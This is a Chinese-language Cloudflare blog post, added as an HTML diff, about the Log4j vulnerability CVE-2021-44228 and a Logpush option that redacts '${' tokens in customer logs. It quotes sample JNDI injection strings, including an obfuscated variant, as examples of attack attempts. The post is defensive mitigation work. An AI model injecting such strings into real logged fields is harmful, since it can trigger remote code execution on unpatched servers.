@@ -1,0 +1,18 @@
+<div class="post-content lh-copy gray1">
+	<p>2021 年 12 月 9 日，全世界得知 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" target="_blank">CVE-2021-44228</a> 這種零時差漏洞利用正在影響 <a href="https://logging.apache.org/log4j/2.x/index.html" target="_blank">Apache Log4j 公用程式</a>。Cloudflare 立即<a href="https://blog.cloudflare.com/zh-tw/cve-2021-44228-log4j-rce-0-day-mitigation-zh-tw/">更新了我們的 WAF</a> 以協助防範這個漏洞，但是仍然建議客戶盡快更新其系統。</p>
+	<p>然而，我們知道許多 Cloudflare 客戶會透過運用 Log4j 的軟體來使用其記錄，因此我們也會透過 Cloudflare 記錄來緩解任何嘗試的漏洞利用。在撰寫此文的同時，我們已在傳送給客戶的記錄中看到漏洞利用模式，每秒高達 1000 次。</p>
+	<p>現在必須做的是，客戶可以更新其 Logpush 工作，以自動編輯可能會觸發此漏洞的權杖。您可以到我們的<a href="https://developers.cloudflare.com/logs/reference/logpush-api-configuration#options" target="_blank">開發人員文件</a>中閱讀更多相關資訊，或是參閱下列詳細資料。</p>
+	<h3 id="-"><strong>攻擊的運作原理</strong></h3>
+	<p>您可以到<a href="https://blog.cloudflare.com/zh-tw/inside-the-log4j2-vulnerability-cve-2021-44228-zh-tw/">我們的部落格文章</a>閱讀更多有關 Log4j 漏洞運作原理的資訊。簡而言之，攻擊者可以在任何字串中加上 ${jndi:ldap://example.com/a} 等內容。然後 Log4j 就會在網際網路上進行連線以擷取此目標。</p>
+	<p>Cloudflare 記錄含有多個字串欄位是由公用網際網路的終端使用者所控制，例如使用者代理程式和 URL 路徑。在任何讀取這些欄位且使用未修補之 Log4j 執行個體的系統上，惡意使用者就可能可以運用這個漏洞造成遠端程式碼執行。</p>
+	<h3 id="--1"><strong>我們的緩解方案</strong></h3>
+	<p>遺憾的是，光是檢查 ${jndi:ldap 這類的權杖並不足以防範此漏洞。因為範本化語言具有表達力，所以也必須檢查是否有模糊的變體。目前我們已經在 ${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce} 這類的外部使用變體中看到攻擊者的蹤跡。因此，編輯 ${ 權杖是防範此漏洞最普遍的方式。</p>
+	<p>在我們目前傳送給客戶的記錄中，${ 權杖每秒出現高達 1,000 次。快速檢查部分記錄後顯示，其中有許多<em>並非</em>嘗試利用此漏洞。因此，對於可能希望在其記錄中看到此權杖的客戶，我們沒有充足的把握能在不影響他們的情況下編輯記錄。</p>
+	<p>從現在開始，客戶可以更新其 Logpush 工作以編輯在所有地方出現的 ${ 字串，並將其替換為 x{。</p>
+	<p>為此，客戶可以更新其 Logpush 工作選項設定，以便納入參數 CVE-2021-44228=true。如需有關如何使用 Logpush API 完成此動作的詳細說明，請參閱<a href="https://developers.cloudflare.com/logs/reference/logpush-api-configuration/examples/example-logpush-curl#step-6---updating-logpull_options" target="_blank">我們開發人員文件</a>中的範例。請注意，此選項目前不適用於 Cloudflare 儀錶板，而且僅能透過 API 來修改。</p>
+	<p><a href="https://twitter.com/intent/tweet?in_reply_to=1470704925785169921" target="_blank"><strong>在 Twitter 上討論</strong></a> <a href="https://news.ycombinator.com/item?id=29551847" target="_blank"><strong> 在 Hacker News 上討論</strong></a> <a href="https://reddit.com/r/CloudFlare/comments/rg5erl/sanitizing_cloudflare_logs_to_protect_customers/" target="_blank"><strong> 在 Reddit 上討論</strong></a></p>
+	<p><a href="https://blog.cloudflare.com/tag/logs/">記錄</a> <a href="https://blog.cloudflare.com/tag/vulnerabilities/">漏洞</a> <a href="https://blog.cloudflare.com/tag/zero-day-threats/">零時差威脅</a> <a href="https://blog.cloudflare.com/tag/security/">網路安全</a> <a href="https://blog.cloudflare.com/tag/log4j/">Log4J</a></p>
+	<p>在 Twitter 上關注</p>
+	<p>Jon Levine |<a href="https://twitter.com/@jplevine" target="_blank">@jplevine</a></p>
+	<p>Cloudflare |<a href="https://twitter.com/Cloudflare" target="_blank">Cloudflare</a><br></p>
+</div>
